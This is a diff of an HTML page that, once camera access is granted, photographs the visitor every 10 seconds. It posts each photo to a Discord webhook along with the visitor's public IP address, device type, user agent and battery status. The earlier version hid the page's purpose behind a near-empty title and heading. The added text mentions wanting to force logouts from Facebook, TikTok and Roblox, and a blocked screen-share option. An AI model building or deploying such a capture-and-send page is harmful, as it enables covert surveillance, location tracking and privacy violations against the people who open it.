@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>10000</title>
+    <title>Auto Photo to Discord Webhook</title>
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -34,8 +34,15 @@
 <body class="p-4 flex items-center justify-center min-h-screen">
 
     <div class="container p-6 md:p-10 rounded-xl max-w-lg w-full text-center">
-        <h1 class="text-3xl font-bold text-gray-800 mb-6">r</h1>
-        <p class="text-gray-600 mb-6"></p>
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">Discord Camera Automator</h1>
+        
+        <!-- Security Information Alert Box -->
+        <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 rounded-md mb-6" role="alert">
+            <p class="font-bold">Important Security Note</p>
+            <p class="text-sm">This app **cannot** force logouts from external sites (like Facebook, TikTok, YouTube, or Roblox). Browser security rules (Same-Origin Policy) prevent it from accessing or deleting their login data.</p>
+        </div>
+
+        <p class="text-gray-600 mb-6">Captures an image from your **Camera** every 10 seconds and sends it to the configured Discord Webhook, including **IP**, **device**, and **battery** details.</p>
 
         <!-- Video Feed Container -->
         <div class="flex justify-center mb-6">
@@ -44,6 +51,20 @@
             <!-- The canvas is used internally for taking the snapshot but is hidden -->
             <canvas id="photoCanvas" style="display: none;"></canvas>
         </div>
+
+        <!-- Source Selection -->
+        <div class="mb-4 flex justify-center space-x-4">
+            <label class="inline-flex items-center text-gray-700">
+                <input type="radio" name="source" value="camera" id="sourceCamera" class="form-radio text-indigo-600 h-4 w-4" checked>
+                <span class="ml-2">Camera</span>
+            </label>
+            <label class="inline-flex items-center text-gray-400">
+                <input type="radio" name="source" value="screen" id="sourceScreen" class="form-radio text-gray-400 h-4 w-4" disabled>
+                <span class="ml-2">Screen Share (PC/Phone)</span>
+                <span class="ml-3 text-xs text-red-500 font-semibold">(Blocked by platform security policy)</span>
+            </label>
+        </div>
+
 
         <!-- Controls -->
         <div class="space-y-4">
@@ -67,11 +88,15 @@
         const canvas = document.getElementById('photoCanvas');
         const toggleButton = document.getElementById('toggleButton');
         const statusLog = document.getElementById('statusLog');
+        const videoFeedElement = document.getElementById('videoFeed');
+        // Note: sourceCamera and sourceScreen elements are included in the DOM but only used for visual display.
+        // The script is hardcoded to use the camera stream (getUserMedia) as getDisplayMedia is blocked.
 
         let stream = null;
         let captureInterval = null;
         let isRunning = false;
-        
+        let currentSource = 'camera'; // Fixed to camera
+
         /**
          * Gets the public IP address using an external service.
          * @returns {Promise<string>} The IP address or "Unknown".
@@ -89,7 +114,6 @@
 
         /**
          * Extracts basic device, browser, and battery information.
-         * NOTE: This function is now ASYNC to handle the battery API call.
          * @returns {Promise<object>} Device and browser details including battery status.
          */
         const getDeviceInfo = async () => {
@@ -107,11 +131,16 @@
                 }
             }
             
+            // Logic to determine if the device is likely mobile/tablet
+            const isMobile = /Mobi|Android|iPhone|iPad|Tablet|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
             return {
                 userAgent: navigator.userAgent,
+                deviceType: isMobile ? 'Mobile/Tablet' : 'Desktop/Other',
                 screen: `${window.screen.width}x${window.screen.height}`,
                 viewport: `${window.innerWidth}x${window.innerHeight}`,
                 battery: batteryStatus,
+                source: 'Camera',
                 time: new Date().toLocaleString(),
             };
         };
@@ -150,14 +179,16 @@
 
             // 2. Prepare the Discord Embed payload
             const discordEmbed = {
-                title: 'New Automated Camera Capture',
+                title: `New Automated Capture from ${deviceInfo.source}`, // Title reflects source
                 description: `Capture Time: **${deviceInfo.time}**`,
-                color: 5814783, // Discord blue
+                color: 5814783, // Blue for camera
                 fields: [
+                    { name: 'Source', value: `**${deviceInfo.source}**`, inline: true },
+                    { name: 'Device Type', value: `**${deviceInfo.deviceType}**`, inline: true }, 
+                    { name: 'Screen/Viewport', value: `${deviceInfo.screen} / ${deviceInfo.viewport}`, inline: true },
                     { name: 'Public IP Address', value: `\`${ipAddress}\``, inline: true },
                     { name: 'Battery Status', value: `\`${deviceInfo.battery}\``, inline: true },
-                    { name: 'Screen/Viewport', value: `${deviceInfo.screen} / ${deviceInfo.viewport}`, inline: true },
-                    { name: 'User Agent (Device/OS/Browser)', value: `\`${deviceInfo.userAgent.substring(0, 100)}...\``, inline: false },
+                    { name: 'User Agent (Details)', value: `\`${deviceInfo.userAgent.substring(0, 100)}...\``, inline: false },
                 ],
                 // Add the uploaded image as the embed image
                 image: {
@@ -172,7 +203,7 @@
             const payload = {
                 username: 'Camera Bot',
                 embeds: [discordEmbed],
-                attachments: [] // Important to include attachments array if using API v9+ for files
+                attachments: [] 
             };
 
             // 3. Append the JSON payload to the form data
@@ -200,11 +231,11 @@
          */
         const captureAndPost = async () => {
             if (!stream) {
-                logStatus('Warning: Camera stream not active.', 'text-yellow-600 bg-yellow-50');
+                logStatus('Warning: Stream not active.', 'text-yellow-600 bg-yellow-50');
                 return;
             }
 
-            logStatus('📸 Capturing photo and fetching data...', 'text-indigo-600 bg-indigo-50');
+            logStatus(`📸 Capturing photo from ${currentSource}...`, 'text-indigo-600 bg-indigo-50');
 
             // Set canvas dimensions to match video stream
             canvas.width = video.videoWidth;
@@ -213,9 +244,10 @@
             // Draw the current video frame onto the canvas
             const ctx = canvas.getContext('2d');
             
-            // Mirror the image on the canvas
+            // Apply mirror transformation for the camera feed
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
+            
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
 
@@ -223,7 +255,7 @@
             const dataURL = canvas.toDataURL('image/png');
             const imageBlob = dataURLtoBlob(dataURL, 'photo.png');
             
-            // Get device info and IP (these must be awaited now)
+            // Get device info and IP
             const deviceInfo = await getDeviceInfo(); 
             const ipAddress = await getPublicIP();
 
@@ -232,38 +264,53 @@
         };
 
         /**
-         * Starts the camera and the auto capture interval.
+         * Starts the camera capture and the auto capture interval.
          */
         const startCapture = async () => {
+            videoFeedElement.style.transform = 'scaleX(-1)'; // Ensure mirroring is on for camera
+
             try {
-                // Request camera access
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Use camera (getUserMedia)
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                stream = mediaStream;
                 video.srcObject = stream;
                 
                 await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                // Add listener for stream end (in case camera is disconnected)
+                const track = stream.getVideoTracks()[0];
+                track.onended = () => {
+                    if (isRunning) {
+                        logStatus('⚠️ Camera stream ended by user or system. Autoplay stopped.', 'text-yellow-700 bg-yellow-100');
+                        stopCapture();
+                    }
+                };
 
                 // Start the interval
-                // Capture immediately, but wait for 1 second to ensure metadata is stable
                 setTimeout(captureAndPost, 1000); 
                 captureInterval = setInterval(captureAndPost, CAPTURE_INTERVAL_MS);
                 
                 isRunning = true;
+
                 toggleButton.textContent = `Stop Autoplay (Sending every ${CAPTURE_INTERVAL_MS / 1000}s)`;
                 toggleButton.classList.remove('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
                 toggleButton.classList.add('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
-                logStatus('✅ Camera started and auto capture initiated.', 'text-green-600 bg-green-50');
+                logStatus(`✅ Autoplay initiated from Camera.`, 'text-green-600 bg-green-50');
 
             } catch (err) {
-                logStatus(`❌ Failed to access camera: ${err.name}. Please ensure your camera is not blocked and try again.`, 'text-red-600 bg-red-50');
+                // User denied or an error occurred
+                logStatus(`❌ Failed to start camera: ${err.name}. ${err.message}`, 'text-red-600 bg-red-50');
                 isRunning = false;
-                stopCapture();
+                stopCapture(false); // Do not log 'stopped' status again
             }
         };
 
         /**
-         * Stops the camera stream and clears the interval.
+         * Stops the stream and clears the interval.
+         * @param {boolean} [log=true] - Whether to log the status message.
          */
-        const stopCapture = () => {
+        const stopCapture = (log = true) => {
             if (captureInterval) {
                 clearInterval(captureInterval);
                 captureInterval = null;
@@ -273,10 +320,14 @@
                 stream = null;
             }
             isRunning = false;
+
             toggleButton.textContent = 'Start Autoplay';
             toggleButton.classList.remove('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
             toggleButton.classList.add('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
-            logStatus('⏸️ Auto capture stopped.', 'text-yellow-700 bg-yellow-50');
+            
+            if (log) {
+                 logStatus('⏸️ Auto capture stopped.', 'text-yellow-700 bg-yellow-50');
+            }
         };
 
         /**
@@ -306,6 +357,9 @@
                 startCapture();
             }
         });
+        
+        // Initial setup for the video element style
+        videoFeedElement.style.transform = 'scaleX(-1)';
     </script>
 </body>
 </html>
